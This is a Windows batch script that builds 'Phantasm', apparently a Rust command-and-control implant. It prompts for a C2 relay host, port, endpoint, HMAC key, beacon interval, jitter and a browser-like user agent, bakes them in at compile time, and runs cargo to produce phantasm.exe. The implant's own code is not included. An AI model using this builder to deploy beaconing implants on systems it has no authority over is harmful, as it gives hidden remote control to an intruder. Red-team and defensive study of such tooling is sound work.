@echo off
setlocal enabledelayedexpansion

echo ==========================================
echo   Phantasm Agent Builder (Rust)
echo ==========================================
echo.

REM Prompt for configuration
set /p C2_HOST="C2 Relay Host [localhost]: "
if "%C2_HOST%"=="" set C2_HOST=localhost

set /p C2_PORT="C2 Relay Port [8080]: "
if "%C2_PORT%"=="" set C2_PORT=8080

set /p C2_ENDPOINT="C2 Endpoint [/wiki]: "
if "%C2_ENDPOINT%"=="" set C2_ENDPOINT=/wiki

set /p HMAC_KEY="HMAC Key (hex): "

if "%HMAC_KEY%"=="" (
    echo [ERROR] HMAC key is required!
    exit /b 1
)

set /p BEACON_INTERVAL="Beacon Interval (seconds) [15]: "
if "%BEACON_INTERVAL%"=="" set BEACON_INTERVAL=15

set /p JITTER="Jitter (seconds) [10]: "
if "%JITTER%"=="" set JITTER=10

set /p USER_AGENT="User Agent [Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36]: "
if "%USER_AGENT%"=="" set USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

echo.
echo Configuration:
echo   Host:            %C2_HOST%
echo   Port:            %C2_PORT% (HTTPS)
echo   Endpoint:        %C2_ENDPOINT%
echo   HMAC Key:        %HMAC_KEY:~0,16%...%HMAC_KEY:~-8%
echo   Beacon Interval: %BEACON_INTERVAL%s
echo   Jitter:          %JITTER%s
echo.

REM Write configuration to a temp build config
echo LISTENER_HOST=%C2_HOST%> build_config.env
echo LISTENER_PORT=%C2_PORT%>> build_config.env
echo LISTENER_ENDPOINT=%C2_ENDPOINT%>> build_config.env
echo HMAC_KEY_HEX=%HMAC_KEY%>> build_config.env
echo RECONNECT_INTERVAL=%BEACON_INTERVAL%>> build_config.env
echo JITTER_SECONDS=%JITTER%>> build_config.env
echo USER_AGENT=%USER_AGENT%>> build_config.env

echo [*] Building with cargo (release + optimizations)...
echo.

REM Set environment variables for compile-time substitution
set PHANTASM_HOST=%C2_HOST%
set PHANTASM_PORT=%C2_PORT%
set PHANTASM_ENDPOINT=%C2_ENDPOINT%
set PHANTASM_HMAC_KEY=%HMAC_KEY%
set PHANTASM_INTERVAL=%BEACON_INTERVAL%
set PHANTASM_JITTER=%JITTER%
set PHANTASM_USER_AGENT=%USER_AGENT%

REM Build with cargo in release mode
cargo build --release --target x86_64-pc-windows-msvc

if %ERRORLEVEL% EQU 0 (
    echo.
    echo [SUCCESS] Build complete: target\x86_64-pc-windows-msvc\release\phantasm.exe
    echo.
    dir /b target\x86_64-pc-windows-msvc\release\phantasm.exe
) else (
    echo.
    echo [ERROR] Build failed!
    exit /b 1
)

